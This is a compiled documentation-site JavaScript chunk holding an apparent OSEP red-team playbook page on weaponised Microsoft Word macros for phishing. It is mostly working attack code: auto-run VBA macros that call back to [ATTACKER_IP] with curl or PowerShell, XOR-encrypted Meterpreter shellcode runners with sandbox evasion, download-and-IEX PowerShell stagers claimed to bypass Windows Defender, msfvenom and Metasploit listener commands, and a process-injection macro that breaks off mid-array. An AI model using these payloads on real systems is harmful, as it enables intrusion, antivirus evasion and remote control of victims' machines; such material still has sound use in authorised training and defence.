"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[3953],{3179(e,n,r){r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"osep/initial-access/phishing/microsoft-word","title":"Microsoft Word (Macros)","description":"Callback Pinging","source":"@site/docs/osep/initial-access/phishing/microsoft-word.md","sourceDirName":"osep/initial-access/phishing","slug":"/osep/initial-access/phishing/microsoft-word","permalink":"/OSEP-Playbook/docs/osep/initial-access/phishing/microsoft-word","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"title":"Microsoft Word (Macros)","sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"Send Emails Commands","permalink":"/OSEP-Playbook/docs/osep/initial-access/phishing/send-emails"},"next":{"title":"JScript","permalink":"/OSEP-Playbook/docs/osep/initial-access/phishing/JScript"}}');var t=r(4848),o=r(8453);const i={title:"Microsoft Word (Macros)",sidebar_position:2},a=void 0,l={},c=[{value:"<strong>Callback Pinging</strong>",id:"callback-pinging",level:3},{value:"<strong>Determine Target Architecture</strong>",id:"determine-target-architecture",level:3},{value:"<strong>Shellcode Runner - Meterpreter Encrypted</strong>",id:"shellcode-runner---meterpreter-encrypted",level:3},{value:"<strong>Shellcode Runner - C# VBA Encrypted</strong>",id:"shellcode-runner---c-vba-encrypted",level:3},{value:"<strong>PowerShell Stager - Encrypted &amp; Obfuscated</strong>",id:"powershell-stager---encrypted--obfuscated",level:3},{value:"<strong>PowerShell Stager - Unencrypted</strong>",id:"powershell-stager---unencrypted",level:3},{value:"<strong>Process Injection - Meterpreter Encrypted</strong>",id:"process-injection---meterpreter-encrypted",level:3},{value:"<strong>Process Hollow - Meterpreter Encrypted</strong>",id:"process-hollow---meterpreter-encrypted",level:3}];function d(e){const n={code:"code",em:"em",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h3,{id:"callback-pinging",children:(0,t.jsx)(n.strong,{children:"Callback Pinging"})}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.strong,{children:"Purpose"}),"\xa0This Macros file is just to get a callback from the victim and understand what is happening, it is not ideal for real operations but it is for testing purposes"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Code"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-csharp",children:'Sub MyMacro()\n    Dim Command As String\n    Command = "C:\\Windows\\System32\\curl.exe http://[ATTACKER_IP]/worked"\n    Shell Command, vbHide\nEnd Sub\n\nSub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\n'})}),"\n",(0,t.jsx)(n.h3,{id:"determine-target-architecture",children:(0,t.jsx)(n.strong,{children:"Determine Target Architecture"})}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.strong,{children:"Purpose"}),"\xa0We can use special non-malicious Macros to find the architecture of the target and therefore crafting the payloads and stagers correctly avoid running issues. Remember to run\xa0",(0,t.jsx)(n.code,{children:"nc -nvlp 80"}),"\xa0prior to delivering them."]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Macros Using Curl"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-csharp",children:'Option Explicit\n\nSub SendProcessInfo()\n    Dim processName As String, serverUrl As String, wmiService As Object, processList As Object, processItem As Object\n    Dim result As String, is64Bit As Boolean\n\n    serverUrl = "http://CHANGE TO YOUR IP" \' Change this to your server endpoint\n    processName = "winword.exe" \' Replace with your process name\n\n    \' Create WMI query and get process list\n    Set wmiService = GetObject("winmgmts:\\\\.\\root\\CIMV2")\n    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = \'" & processName & "\'")\n\n    \' Check if process is found and determine 64-bit status\n    If processList.Count > 0 Then\n        For Each processItem In processList\n            is64Bit = InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0\n            result = "Process: " & processName & ", 64-bit: " & CStr(is64Bit)\n        Next\n    Else\n        result = "Process not found."\n    End If\n\n    \' Execute cURL command\n    Shell "cmd.exe /c curl -X POST -d """ & result & """ " & serverUrl, vbHide\nEnd Sub\nSub AutoOpen()\n    SendProcessInfo\nEnd Sub\nSub DocumentOpen()\n    SendProcessInfo\nEnd Sub\n\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Macros Using PowerShell"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-csharp",children:'Option Explicit\n\nSub SendProcessInfo()\n    Dim processName As String\n    Dim is64Bit As Boolean\n    Dim result As String\n    Dim wmiService As Object\n    Dim processList As Object\n    Dim processItem As Object\n    Dim psCommand As String\n\n    processName = "explorer.exe" \' Use uppercase for process name for consistency\n    Set wmiService = GetObject("winmgmts:\\\\.\\root\\CIMV2")\n    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = \'" & processName & "\'")\n\n    If processList.Count > 0 Then\n        For Each processItem In processList\n            \' Check if the executable is located in "Program Files (x86)"\n            is64Bit = (InStr(1, processItem.ExecutablePath, "Program Files (x86)", vbTextCompare) = 0)\n            Exit For \' Only need to check the first matching process\n        Next processItem\n        result = "{""process"": """ & processName & """, ""64bit"": " & CStr(is64Bit) & "}"\n    Else\n        result = "{""process"": """ & processName & """, ""status"": ""not found""}"\n    End If\n\n    \' Prepare the PowerShell command\n    psCommand = "powershell -Command ""Invoke-RestMethod -Uri \'http://[ATTACKER_IP]\' -Method Post -Body \'" & result & "\' -ContentType \'application/json\'"""\n\n    \' Execute the PowerShell command\n    Shell "cmd.exe /c " & psCommand, vbHide\nEnd Sub\n\nSub AutoOpen()\nSendProcessInfo\nEnd Sub\nSub DocumentOpen()\nSendProcessInfo\nEnd Sub\n\n'})}),"\n",(0,t.jsx)(n.h3,{id:"shellcode-runner---meterpreter-encrypted",children:(0,t.jsx)(n.strong,{children:"Shellcode Runner - Meterpreter Encrypted"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Create your shellcode"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# If you change the key, then change it in the vba code too\nmsfvenom -p windows/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Create a new file Macros"}),"\xa0and insert your shellcode from step above and save the file as a\xa0",(0,t.jsx)(n.code,{children:".docm"})]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-csharp",children:'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr\nPrivate Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr\nPrivate Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long\nPrivate Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long\n\nSub Document_Open()\n  ShellcodeRunner\nEnd Sub\n\nSub AutoOpen()\n  ShellcodeRunner\nEnd Sub\n\nFunction ShellcodeRunner()\n  Dim sc As Variant\n  Dim tmp As LongPtr\n  Dim addr As LongPtr\n  Dim counter As Long\n  Dim data As Long\n  Dim res As Long\n  Dim dream As Integer\n  Dim before As Date\n\n  \' Check if we\'re in a sandbox by calling a rare-emulated API\n  If IsNull(FlsAlloc(tmp)) Then\n    Exit Function\n  End If\n\n  \' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction\n  dream = Int((1500 * Rnd) + 2000)\n  before = Now()\n  Sleep (dream)\n  If DateDiff("s", t, Now()) < dream Then\n    Exit Function\n  End If\n\n  Key = "a"\n\n  \' msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a\n  sc = Array(157, 137, 238, 97, 97, 97, 1, 80, 179, 5, 234, 51, 81, 234, 51, 109, 232, 132, 234, 51, 117, 80, 158, 110, 214, 43, 71, 234, 19, 73, 80, 161, 205, 93, 0, 29, 99, 77, 65, 160, 174, 108, 96, 166, 40, 20, 142, 51, 54, 234, 51, 113, 234, 35, 93, 96, 177, 234, 33, 25, 228, 161, 21, 45, 96, 177, 49, 234, 41, 121, 234, 57, 65, 96, 178, 228, 168, 21, 93, 80, 158, _\n40, 234, 85, 234, 96, 183, 80, 161, 160, 174, 108, 205, 96, 166, 89, 129, 20, 149, 98, 28, 153, 90, 28, 69, 20, 129, 57, 234, 57, 69, 96, 178, 7, 234, 109, 42, 234, 57, 125, 96, 178, 234, 101, 234, 96, 177, 232, 37, 69, 69, 58, 58, 0, 56, 59, 48, 158, 129, 57, 62, 59, 234, 115, 136, 225, 158, 158, 158, 60, 9, 82, 83, 97, 97, 9, 22, 18, 83, 62, 53, _\n9, 45, 22, 71, 102, 232, 137, 158, 177, 217, 241, 96, 97, 97, 72, 165, 53, 49, 9, 72, 225, 10, 97, 158, 180, 11, 107, 9, 161, 201, 83, 4, 9, 99, 97, 96, 218, 232, 135, 49, 49, 49, 49, 33, 49, 33, 49, 9, 139, 110, 190, 129, 158, 180, 246, 11, 113, 55, 54, 9, 248, 196, 21, 0, 158, 180, 228, 161, 21, 107, 158, 47, 105, 20, 141, 137, 6, 97, 97, 97, _\n11, 97, 11, 101, 55, 54, 9, 99, 184, 169, 62, 158, 180, 226, 153, 97, 31, 87, 234, 87, 11, 33, 9, 97, 113, 97, 97, 55, 11, 97, 9, 57, 197, 50, 132, 158, 180, 242, 50, 11, 97, 55, 50, 54, 9, 99, 184, 169, 62, 158, 180, 226, 153, 97, 28, 73, 57, 9, 97, 33, 97, 97, 11, 97, 49, 9, 106, 78, 110, 81, 158, 180, 54, 9, 20, 15, 44, 0, 158, 180, _\n63, 63, 158, 109, 69, 110, 228, 17, 158, 158, 158, 136, 250, 158, 158, 158, 96, 162, 72, 167, 20, 160, 162, 218, 129, 124, 75, 107, 9, 199, 244, 220, 252, 158, 180, 93, 103, 29, 107, 225, 154, 129, 20, 100, 218, 38, 114, 19, 14, 11, 97, 50, 158, 180)\n\n  Dim scSize As Long\n    scSize = UBound(sc)\n    \' Decrypt shellcode\n    Dim keyArrayTemp() As Byte\n    keyArrayTemp = Key\n\n    i = 0\n    For x = 0 To UBound(sc)\n        sc(x) = sc(x) Xor keyArrayTemp(i)\n        i = (i + 2) Mod (Len(Key) * 2)\n    Next x\n\n    \' TODO set the SIZE here (use a size > to the shellcode size)\n    Dim buf(685) As Byte\n    For y = 0 To UBound(sc)\n        buf(y) = sc(y)\n    Next y\n\n  \' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE\n  \' &H40 = 0x40 = PAGE_EXECUTE_READWRITE\n  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n\n  For counter = LBound(buf) To UBound(buf)\n    data = buf(counter)\n    res = RtlMoveMemory(addr + counter, data, 1)\n  Next counter\n\n  res = CreateThread(0, 0, addr, 0, 0, 0)\nEnd Function\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Start your Metasploit listener"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Deliver your Word Stager and wait for access"})}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"shellcode-runner---c-vba-encrypted",children:(0,t.jsx)(n.strong,{children:"Shellcode Runner - C# VBA Encrypted"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Create your Shellcode"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f csharp\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Encrypt the shellcode"}),", they are many ways to do it but I will use this personal C# VBA Encrypter"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\n\nnamespace vba_encrypter\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            byte[] buf = new byte[681] {0xfc,0xe8,0x8f,0x00,0x00,0x00,\n0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,\n....\n0x53,0xff,0xd5};\n            byte[] encoded = new byte[buf.Length];\n            for (int i = 0; i < buf.Length; i++)\n            {\n                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);\n            }\n            uint counter = 0;\n            StringBuilder hex = new StringBuilder(encoded.Length * 2);\n            foreach (byte b in encoded)\n            {\n                hex.AppendFormat("{0:D}, ", b);\n                counter++;\n                if (counter % 50 == 0)\n                {\n                    hex.AppendFormat("_{0}", Environment.NewLine);\n                }\n            }\n            Console.WriteLine("The payload is: " + hex.ToString());\n        }\n    }\n}\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Create the Macros file"}),", use code below inserting your encrypted shellcode and save the file as a\xa0",(0,t.jsx)(n.code,{children:".docm"})]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-csharp",children:'Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr\n\nPrivate Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n\nPrivate Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr\n\nFunction MyMacro()\n    Dim buf As Variant\n    Dim addr As LongPtr\n    Dim counter As Long\n    Dim data As Long\n    Dim res As LongPtr\n\n    buf = Array(254, 234, 145, ..., 85, 1, 215)\n\n    For i = 0 To UBound(buf)\n    buf(i) = buf(i) - 2\n    Next i\n\n    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n    For counter = LBound(buf) To UBound(buf)\n    data = buf(counter)\n    res = RtlMoveMemory(addr + counter, data, 1)\n    Next counter\n\n    res = CreateThread(0, 0, addr, 0, 0, 0)\nEnd Function\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub AutoOpen()\n    MyMacro\nEnd Sub\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Start your Metasploit listener"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Deliver your Macros"}),"\xa0and wait for execution and your reverse shell"]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"powershell-stager---encrypted--obfuscated",children:(0,t.jsx)(n.strong,{children:"PowerShell Stager - Encrypted & Obfuscated"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"IMPORTANT: it was tested in lab machine and successfully bypass Windows Defender, but if AMSI protection is enabled then it could not work"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Create your Shellcode"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f ps1\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Create your PowerShell script"}),", inset here your shellcode and save the file as\xa0",(0,t.jsx)(n.code,{children:"run.ps1"}),", this is supposed to be loaded directly in memory, therefore not touching the disk and avoiding AV scanning"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:'$Kernel32 = @"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class Kernel32 {\n    [DllImport("kernel32")]\n    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,\n        uint flAllocationType, uint flProtect);\n\n    [DllImport("kernel32", CharSet=CharSet.Ansi)]\n    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,\n        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,\n            uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport("kernel32.dll", SetLastError=true)]\n    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,\n        UInt32 dwMilliseconds);\n}\n"@\n\nAdd-Type $Kernel32\n\n# INSERT SHELLCODE HERE\n[Byte[]] $buf = 0xfc,0x48,0x83,..,0x41,0x89,0xda,0xff\n\n$size = $buf.Length\n\n[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);\n\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)\n\n$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);\n[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Encrypt your PS Code"}),", this scipt will transform the characters to their ASCII value and do a Caesar encryption"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:'$payload = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring(\'http://[ATTACKER_IP]/[stager_filename].txt\'))"\n\n[string]$output = ""\n\n$payload.ToCharArray() | %{\n    [string]$thischar = [byte][char]$_ + 17\n    if($thischar.Length -eq 1)\n    {\n        $thischar = [string]"00" + $thischar\n        $output += $thischar\n    }\n    elseif($thischar.Length -eq 2)\n    {\n        $thischar = [string]"0" + $thischar\n        $output += $thischar\n    }\n    elseif($thischar.Length -eq 3)\n    {\n        $output += $thischar\n    }\n}\n$output | clip\n$output\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Create your Macros"}),", copy the contents from above step to the payload part and save the file as a\xa0",(0,t.jsx)(n.code,{children:".docm"})]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-csharp",children:'Function Pears(Beets)\n    Pears = Chr(Beets - 17)\nEnd Function\n\nFunction Strawberries(Grapes)\n    Strawberries = Left(Grapes, 3)\nEnd Function\n\nFunction Almonds(Jelly)\n    Almonds = Right(Jelly, Len(Jelly) - 3)\nEnd Function\n\nFunction Nuts(Milk)\n    Do\n    Oatmilk = Oatmilk + Pears(Strawberries(Milk))\n    Milk = Almonds(Milk)\n    Loop While Len(Milk) > 0\n    Nuts = Oatmilk\nEnd Function\n\nFunction MyMacro()\n    Dim Apples As String\n    Dim Water As String\n\n    // Payload resulting from previous step\n    Apples = "1291281361042112211.............640633137133056058058"\n    Water = Nuts(Apples)\n    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin\nEnd Function\n\nSub AutoOpen()\n    Mymacro\nEnd Sub\n\n'})}),"\n",(0,t.jsx)(n.h3,{id:"powershell-stager---unencrypted",children:(0,t.jsx)(n.strong,{children:"PowerShell Stager - Unencrypted"})}),"\n",(0,t.jsxs)(n.p,{children:["Keep in mind that these makes some\xa0",(0,t.jsx)(n.em,{children:"Win32 API"}),"\xa0calls to avoid loading in disk and avoid AV detection. We need to things:"]}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"The Macros stager that will download the payload, this one does not touches the disk, only memory."}),"\n",(0,t.jsx)(n.li,{children:"The malicious powershell payload that will trigger our reverse shell."}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Create your Shellcode"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f ps1\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Create your PowerShell script"}),", inset here your shellcode and save the file as\xa0",(0,t.jsx)(n.code,{children:"run.ps1"})]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:'$Kernel32 = @"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class Kernel32 {\n    [DllImport("kernel32")]\n    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,\n        uint flAllocationType, uint flProtect);\n\n    [DllImport("kernel32", CharSet=CharSet.Ansi)]\n    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,\n        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,\n            uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport("kernel32.dll", SetLastError=true)]\n    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,\n        UInt32 dwMilliseconds);\n}\n"@\n\nAdd-Type $Kernel32\n\n# INSERT SHELLCODE HERE\n[Byte[]] $buf = 0xfc,0x48,0x83,..,0x41,0x89,0xda,0xff\n\n$size = $buf.Length\n\n[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);\n\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)\n\n$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);\n[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Create your Macros"}),", and save the file as a\xa0",(0,t.jsx)(n.code,{children:".docm"})]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-csharp",children:"Sub MyMacro()\n    Dim str As String\n    str = \"powershell (New-Object System.Net.WebClient).DownloadString('http://[ATTACKER_IP]/[stager_filename].ps1') | IEX\"\n    Shell str, vbHide\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub AutoOpen()\n    MyMacro\nEnd Sub\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Start your HTTP Server"}),"\xa0to host the ps stager"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"python3 -m http.server 80\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Start your Metasploit listener"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Deliver the Macros to the victim"})}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"process-injection---meterpreter-encrypted",children:(0,t.jsx)(n.strong,{children:"Process Injection - Meterpreter Encrypted"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Create your shellcode"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# If you change the key, then change it in the vba code too\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key '0xfa'\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Create a new file Macros"}),"\xa0and insert your shellcode from step above and save the file as a\xa0",(0,t.jsx)(n.code,{children:".docm"}),", in this case it will inject into\xa0",(0,t.jsx)(n.code,{children:"notepad.exe"}),"\xa0but you can change this"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-csharp",children:'Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long\nPrivate Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr\nPrivate Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\nPrivate Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr\nPrivate Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)\nPrivate Declare PtrSafe Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As LongPtr) As LongPtr\nPrivate Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Integer, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal fAllocType As LongPtr, ByVal flProtect As LongPtr) As LongPtr\nPrivate Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As LongPtr\nPrivate Declare PtrSafe Function CreateRemoteThread Lib "KERNEL32" (ByVal ProcessHandle As LongPtr, ByVal lpThreadAttributes As Long, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByVal lpThreadID As Long) As LongPtr\nPrivate Declare PtrSafe Function CloseHandle Lib "KERNEL32" (ByVal hObject As LongPtr) As Boolean\n\nFunction mymacro()\n    Dim myTime\n    Dim Timein As Date\n    Dim second_time\n    Dim Timeout As Date\n    Dim subtime As Variant\n    Dim vOut As Integer\n    Dim Is64 As Boolean\n    Dim StrFile As String\n\n    myTime = Time\n    Timein = Date + myTime\n    Sleep (4000)\n    second_time = Time\n    Timeout = Date + second_time\n    subtime = DateDiff("s", Timein, Timeout)\n    vOut = CInt(subtime)\n    If subtime < 3.5 Then\n        Exit Function\n    End If\n\n    Dim sc As Variant\n    Dim key As String\n    \' TODO change the key\n    key = "0xfa"\n\n    \'msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key \'0xfa\'\n    sc = Array(204, 144, 233, 97, 48, 120, 6, 80, 226, 28, 237, 51, 0, 241, 131, 234, 98, 116, 237, 51, 36, 243, 20, 73, 1, 135, 105, 214, 122, 94, 87, 161, 156, 68, 7, 29, 50, 84, 70, 160, 255, 117, 103, 166, 121, 13, 137, 51, 103, 243, 52, 113, 187, 58, 90, 96, 224, 